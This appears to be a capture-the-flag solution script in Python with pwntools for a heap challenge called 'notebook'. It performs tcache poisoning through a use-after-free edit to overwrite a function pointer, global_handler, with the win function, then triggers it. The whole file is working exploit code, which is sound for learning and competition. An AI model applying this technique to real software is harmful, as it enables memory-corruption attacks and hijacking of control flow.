#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./notebook', checksec=False)

def conn():
    if args.REMOTE:
        return remote('offsec.m0lecon.it', 13598)
    return process(elf.path)

p = conn()

win_addr       = elf.sym.win
global_handler = elf.sym.global_handler

log.info(f"win:            {hex(win_addr)}")
log.info(f"global_handler: {hex(global_handler)}")

def alloc(idx, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendafter(b'data: ', data)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'index: ', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendafter(b'data: ', data)

def show(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'index: ', str(idx).encode())
    return p.recvuntil(b'\n')

def trigger():
    p.sendlineafter(b'> ', b'5')

# Need 3 real chunks in tcache so the 4th alloc lands at global_handler
alloc(0, b'A' * 8)   # chunk A
alloc(1, b'B' * 8)   # chunk B
alloc(2, b'C' * 8)   # chunk C

free(0)   # tcache: [A] → NULL           count=1
free(1)   # tcache: [B] → A → NULL       count=2
free(2)   # tcache: [C] → B → A → NULL   count=3

# Poison the BOTTOM of the chain (chunk A, freed first = last in list)
# A.fd = global_handler  →  chain: C → B → A → global_handler
edit(0, p64(global_handler))

alloc(3, b'X' * 8)   # pops C, head = B
alloc(4, b'X' * 8)   # pops B, head = A
alloc(5, b'X' * 8)   # pops A, head = global_handler  (tcache now points there)
alloc(6, b'X' * 8)   # pops global_handler → notes[6] = global_handler ✓

# Verify
raw = show(6)
cur = u64(raw[:8].ljust(8, b'\x00'))
log.info(f"global_handler current value: {hex(cur)}  (want 0x0 or default_handler addr)")

edit(6, p64(win_addr))

raw_after = show(6)
readback = u64(raw_after[:8].ljust(8, b'\x00'))
log.info(f"global_handler after write:   {hex(readback)}")

if readback == win_addr:
    log.success("confirmed! triggering...")
    trigger()
else:
    log.error(f"write failed: got {hex(readback)}, expected {hex(win_addr)}")

p.interactive()